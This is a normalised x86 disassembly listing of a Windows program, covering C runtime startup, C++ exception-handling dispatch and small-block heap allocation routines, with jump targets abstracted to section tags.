cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_40bc08
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_40bfb0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_40c6bf
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_4098b4
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40c86c
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40b077
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40b077
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax esi
pop esi
leave
retn
sub_409923
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and eax 0x103
retn
push 0x103
push [ esp + 0x8 ]
call sub_40b979
pop ecx
pop ecx
retn
sub_409951
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
retn
push 0x4
push [ esp + 0x8 ]
call sub_40b979
pop ecx
pop ecx
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
xor esi esi
push esi
call sub_40a3d3
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
call sub_40d674
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40d542
mov [ rw-data ] eax
call sub_40d2f5
call sub_40d23c
call sub_409027
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_40d1e4
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x1c
call sub_409a94
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x60 ] eax
push eax
call sub_409054
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_40d060
pop ecx
pop ecx
retn
sub_409ab8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_40a362
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_409b53
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_409dff
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_409b53
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_40a362
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40a30c
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_409cfa
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_408d17
add esp 0x14
mov ebx eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_40daf0
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_40a362
push 0x1
push esi
call sub_40a228
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_409da2
add esp 0xc
test eax eax
jne r-xdata
call sub_40a362
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_409eb3
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_409cfa
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_408d17
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408bee
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409eb3
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_409da2
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40db40
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_409dff
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_40a362
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_40a2c0
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_409eb3
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40a064
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_408aae
call sub_408af0
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_409dff
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_409f2e
add esp 0x2c
test eax eax
je r-xdata
sub_409f2e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_408b75
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_409ff4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_409ff4
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
cmp [ ebp - 0x2c ] ebx
je r-xdata
call sub_408e3e
push eax
push edi
call sub_40a228
pop ecx
pop ecx
sub_40a03a
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40a064
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_40daf0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_40daf0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40a362
push 0x1
push edi
call sub_40db0c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40daf0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40daf0
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40db0c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_40db0c
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_40db0c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_40dbd0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_40db28
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_40a28f
pop ecx
pop ecx
push eax
push edi
call sub_40dbd0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40a28f
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_408ae2
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40a28f
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_408ae9
jmp r-xdata
push eax
call sub_40a28f
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40a228
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_408ae2
or [ ebp - 0x4 ] 0xffffffff
sub_40a28f
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40a2c0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_408e61
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_408e61
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40a30c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
push 0xa
call sub_40d939
push 0x16
call sub_40f719
pop ecx
pop ecx
push 0x3
call sub_409065
and [ ebp - 0x4 ] 0x0
sub_40a362
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40a30c
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40a3b8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40a3d3
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_40a40f
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_40a40f
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40a44d
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_40a478
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0xc4 ] edi
dec [ ecx ]
jne r-xdata
mov edi 0x80000000
shr edi cl
lea ecx [ ecx + eax + 0x4 ]
not edi
and [ eax + esi * 4 + 0x44 ] edi
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ edx ] ebx
mov [ ebx + edx - 0x4 ] ebx
dec [ eax ]
jne r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
cmp ecx edi
je r-xdata
mov edi edx
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edi
mov ecx [ ebp + 0x8 ]
and [ ecx ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call edi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40dbd0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_40a7a3
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
